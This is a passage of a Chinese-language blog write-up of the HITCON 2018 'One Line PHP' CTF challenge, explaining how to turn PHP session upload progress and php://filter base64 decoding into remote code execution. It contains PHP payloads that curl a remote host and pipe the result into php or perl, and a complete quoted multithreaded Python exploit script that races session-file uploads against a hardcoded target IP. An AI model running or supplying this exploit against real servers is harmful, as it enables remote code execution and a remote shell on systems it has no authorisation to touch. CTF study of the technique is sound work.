style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -c <span style=color:#e6db74>&#34;import base64;print base64.b64decode(&#39;\x11\x22\x23\x24&#39;*24+base64.b64encode(&#39;test&#39;))&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>的执行结果还是test。</p><p>我们只要想办法让<code>upload_progress_</code> 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 <code>upload_progress_</code> 有16个字符</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python></code></pre></td></tr></table></div></div><h1 id=结合利用>结合利用<a hidden class=anchor aria-hidden=true href=#结合利用>#</a></h1><p>将诸如</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>@&lt;?php `curl remote.ip | php - ;?&gt;`
</span></span></code></pre></td></tr></table></div></div><p>的payload三次编码再加上填充数据后作为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的值上传，然后利用</p><p><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever</code> 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-59>59</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> sample, randint
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> multiprocessing.dummy <span style=color:#f92672>import</span> Pool <span style=color:#66d9ef>as</span> ThreadPool
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://54.250.246.238/&#39;</span>
</span></span><span style=display:flex><span>sess_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;iamorange&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Connection&#39;</span>: <span style=color:#e6db74>&#39;close&#39;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Cookie&#39;</span>: <span style=color:#e6db74>&#39;PHPSESSID=&#39;</span> <span style=color:#f92672>+</span> sess_name
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>    junk <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(sample(string<span style=color:#f92672>.</span>ascii_letters, randint(<span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>16</span>)))
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> b64encode(payload <span style=color:#f92672>+</span> junk)
</span></span><span style=display:flex><span>    xx <span style=color:#f92672>=</span> b64encode(b64encode(payload <span style=color:#f92672>+</span> junk))
</span></span><span style=display:flex><span>    xxx <span style=color:#f92672>=</span> b64encode(b64encode(b64encode(payload <span style=color:#f92672>+</span> junk)))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> x <span style=color:#f92672>and</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> xx <span style=color:#f92672>and</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> xxx:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> xxx
</span></span><span style=display:flex><span>        print payload
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>runner1</span>(i):
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span>: <span style=color:#e6db74>&#39;ZZ&#39;</span> <span style=color:#f92672>+</span> payload <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;Z&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        fp <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;/etc/passwd&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>)
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(HOST, files<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;f&#39;</span>: fp}, data<span style=color:#f92672>=</span>data, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>        fp<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>runner2</span>(i):
</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/var/lib/php/sessions/sess_&#39;</span> <span style=color:#f92672>+</span> sess_name
</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> filename
</span></span><span style=display:flex><span>    <span style=color:#75715e># print filename</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>?orange=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> (HOST, filename)
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>        c <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> c <span style=color:#f92672>and</span> <span style=color:#e6db74>&#39;orange&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> c:
</span></span><span style=display:flex><span>            print [c]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;1&#39;</span>:
</span></span><span style=display:flex><span>    runner <span style=color:#f92672>=</span> runner1
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    runner <span style=color:#f92672>=</span> runner2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pool <span style=color:#f92672>=</span> ThreadPool(<span style=color:#ae81ff>32</span>)
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span>map_async( runner, range(<span style=color:#ae81ff>32</span>) )<span style=color:#f92672>.</span>get(<span style=color:#ae81ff>0xffff</span>)
</span></span></code></pre></td></tr></table></div></div><h1 id=相关链接>相关链接<a hidden class=anchor aria-hidden=true href=#相关链接>#</a></h1><ul><li><a href="http://www.wupco.cn/?p=4460">http://www.wupco.cn/?p=4460</a></li><li><a href=https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge>https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a></li><li><a href="https://bugs.php.net/bug.php?id=72681">https://bugs.php.net/bug.php?id=72681</a></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/181124-what-if-e-phi-not-coprime/><span class=title>« Prev</span><br><span>如果RSA加密中的e和phi不互质</span></a>
<a class=next href=https://ret2neo.cn/post/181028-seccon-wp/><span class=title>Next »</span><br><span>SECCON 2018</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>